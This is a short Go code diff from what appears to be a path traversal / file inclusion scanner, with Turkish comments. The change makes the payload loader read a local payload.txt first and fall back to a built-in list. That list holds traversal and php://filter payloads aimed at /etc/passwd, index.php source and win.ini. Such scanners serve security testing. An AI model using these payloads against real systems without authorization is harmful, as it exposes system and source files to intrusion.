@@ -498,13 +498,18 @@ func loadTargets(opts Options) []string {
 
 func loadPayloads(filename string) []string {
 	if filename == "" {
-		// Varsayılan Payload Listesi
-		return []string{
-			"../../../../etc/passwd",
-			"/etc/passwd",
-			"php://filter/convert.base64-encode/resource=index.php",
-			"....//....//....//etc/passwd",
-			"../../../../windows/win.ini",
+		// 1. Öncelik: Yanındaki payload.txt dosyasını kontrol et
+		if _, err := os.Stat("payload.txt"); err == nil {
+			filename = "payload.txt"
+		} else {
+			// 2. Fallback: Dosya yoksa gömülü listeyi kullan
+			return []string{
+				"../../../../etc/passwd",
+				"/etc/passwd",
+				"php://filter/convert.base64-encode/resource=index.php",
+				"....//....//....//etc/passwd",
+				"../../../../windows/win.ini",
+			}
 		}
 	}
 	var p []string
